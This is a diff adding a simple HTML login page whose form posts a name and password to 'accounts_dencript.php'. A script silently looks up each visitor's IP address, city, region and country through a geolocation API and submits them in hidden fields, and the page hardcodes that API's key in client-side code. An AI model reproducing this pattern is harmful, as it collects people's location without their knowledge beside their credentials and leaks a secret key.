@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<meta charset="utf-8" />
+<html>
+<body>
+  <style>
+    h2 {
+      text-align: left;
+    }
+    </style>
+<form method="post" action="accounts_dencript.php">
+  Name:     <h2><input type="text" name="name" required></h2><br>
+  Password: <h2><input type="password" name="password"required></h2>
+  <input type="hidden" name="ip" id="ip"value="ip">
+  <input type="hidden" name="city" id="city"value="city">
+  <input type="hidden" name="country" id="country"value="country">
+  <input type="hidden" name="country_name" id="country_name"value="country_name">
+  <input type="submit">
+</form>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+
+$.getJSON("https://api.ipdata.co?api-key=52946f5abce5d9ee75118ef3f3092035ed4a0a38336d56e76dd9a82c", function (data) {
+
+document.getElementById("ip").value = ""+data.ip+"";
+document.getElementById("city").value = ""+data.city+"";
+document.getElementById("country").value = ""+data.region+"";
+document.getElementById("country_name").value = ""+data.country_name+"";
+})
+
+</script>
+</body>
+</html>
